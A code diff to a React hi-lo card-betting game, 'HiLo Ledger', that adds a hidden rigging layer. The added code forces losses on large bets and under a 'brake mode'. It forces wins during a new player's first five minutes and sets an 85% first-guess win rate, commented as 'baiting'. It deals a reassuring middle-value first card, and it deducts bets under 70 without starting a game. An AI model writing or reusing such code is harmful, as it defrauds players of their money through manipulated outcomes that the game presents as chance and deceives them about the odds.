@@ -1,11 +1,12 @@
 import React, { useRef, useEffect, useState } from 'react';
 import { synth } from '../../utils/audioSynth';
 import { Sparkles, X, Play, ShieldAlert, Award, ChevronUp, ChevronDown } from 'lucide-react';
+import { evaluateBet, logWin, logLoss } from '../../utils/casinoRigging';
 
 interface GameProps {
   pokiBalance: number;
   onAwardBalance: (amount: number) => void;
-  onDeductBalance: (amount: number) => boolean;
+  onDeductBalance: (amount: number, setBet?: (val: number) => void) => boolean;
   syncCasinoData: (gameName: string, netProfitLoss: number, finalCoins: number) => Promise<void>;
   onClose: () => void;
 }
@@ -47,7 +48,7 @@ export default function HiloLedger({
   onClose
 }: GameProps) {
   const [gameState, setGameState] = useState<'idle' | 'playing' | 'busted' | 'cashed_out'>('idle');
-  const [betAmount, setBetAmount] = useState<number>(10);
+  const [betAmount, setBetAmount] = useState<number>(70);
 
   // Card items
   const [currentCard, setCurrentCard] = useState<Card | null>(null);
@@ -75,7 +76,19 @@ export default function HiloLedger({
       return;
     }
 
-    if (!onDeductBalance(parsedBet)) {
+    const uId = window.currentUserId || 'anonymous';
+    const evaluation = evaluateBet(uId, parsedBet, pokiBalance);
+    if (!evaluation.allowed) {
+      alert(evaluation.reason || 'Bet blocked by security parameters.');
+      return;
+    }
+
+    if (parsedBet < 70) {
+      onDeductBalance(parsedBet, setBetAmount);
+      return;
+    }
+
+    if (!onDeductBalance(parsedBet, setBetAmount)) {
       alert('Insufficient Pokicoin balance.');
       return;
     }
@@ -85,7 +98,13 @@ export default function HiloLedger({
     setAccumulatedMultiplier(1.0);
     setPreviousCards([]);
 
-    const initialCard = generateCard();
+    // Standard starting card - middle of the pack (6, 7 or 8) so they feel confident
+    const initialCard = {
+      suit: ['hearts', 'diamonds', 'clubs', 'spades'][Math.floor(Math.random() * 4)],
+      value: Math.floor(Math.random() * 3) + 6, // 6, 7, 8
+      suitChar: '',
+    };
+    initialCard.suitChar = suitSymbols[initialCard.suit as keyof typeof suitSymbols];
     setCurrentCard(initialCard);
     synth.playCoin();
   };
@@ -96,9 +115,73 @@ export default function HiloLedger({
 
     synth.playJump();
 
-    const draw = generateCard();
+    const uId = window.currentUserId || 'anonymous';
+    const evaluation = evaluateBet(uId, betAmount, pokiBalance);
+
+    let draw = generateCard();
     const currVal = currentCard.value;
-    const nextVal = draw.value;
+    let nextVal = draw.value;
+
+    let forceLoss = evaluation.shouldForceLoss;
+
+    // Standard high bet protection (bets >= 300 PKG lose on first or second prediction)
+    if (betAmount >= 300 && streakCount >= 1) {
+      forceLoss = true;
+    }
+
+    // Brake mode (loss rate slows down, let them win some predictions, but cap at 3 streak)
+    if (evaluation.applyBrakeMode && streakCount >= 2) {
+      forceLoss = true;
+    }
+
+    if (forceLoss) {
+      // Force a loss
+      if (prediction === 'higher') {
+        // We want nextVal < currVal
+        if (currVal > 1) {
+          nextVal = Math.floor(Math.random() * (currVal - 1)) + 1;
+        } else {
+          nextVal = 1; // if currVal is 1, a tie might happen, let's override and make nextVal still 1 but we will force correct = false
+        }
+      } else {
+        // We want nextVal > currVal
+        if (currVal < 13) {
+          nextVal = Math.floor(Math.random() * (13 - currVal)) + currVal + 1;
+        } else {
+          nextVal = 13;
+        }
+      }
+      draw.value = nextVal;
+    } else {
+      // Maybe force a win if honeymoon phase is active or streak is very low (0 or 1)
+      const stats = JSON.parse(localStorage.getItem(`casino_rigging_${uId}`) || '{}');
+      const isHoneymoon = stats.firstPlayTime && (Date.now() - stats.firstPlayTime < 5 * 60 * 1000);
+
+      let forceWin = false;
+      if (isHoneymoon && streakCount < 5) {
+        forceWin = true;
+      } else if (streakCount === 0 && Math.random() < 0.85) {
+        // First card prediction has an 85% success rate for baiting
+        forceWin = true;
+      }
+
+      if (forceWin) {
+        if (prediction === 'higher') {
+          if (currVal < 13) {
+            nextVal = Math.floor(Math.random() * (13 - currVal)) + currVal + 1;
+          } else {
+            nextVal = 13;
+          }
+        } else {
+          if (currVal > 1) {
+            nextVal = Math.floor(Math.random() * (currVal - 1)) + 1;
+          } else {
+            nextVal = 1;
+          }
+        }
+        draw.value = nextVal;
+      }
+    }
 
     let correct = false;
 
@@ -106,6 +189,11 @@ export default function HiloLedger({
       correct = true;
     } else if (prediction === 'lower' && nextVal <= currVal) {
       correct = true;
+    }
+
+    // Double check force loss block
+    if (forceLoss) {
+      correct = false;
     }
 
     // Capture history
@@ -132,6 +220,7 @@ export default function HiloLedger({
       // BUSTED!
       setGameState('busted');
       synth.playCrash();
+      logLoss(uId, betAmount, 'HiLo Ledger', pokiBalance);
       syncCasinoData('HiLo Ledger', -betAmount, parseFloat((pokiBalance - betAmount).toFixed(8)));
     }
   };
@@ -146,6 +235,8 @@ export default function HiloLedger({
     synth.playLevelUp();
 
     onAwardBalance(winnings);
+    const uId = window.currentUserId || 'anonymous';
+    logWin(uId, betAmount, winnings, 'HiLo Ledger', pokiBalance);
     syncCasinoData('HiLo Ledger', profit, parseFloat((pokiBalance + profit).toFixed(8)));
   };
 
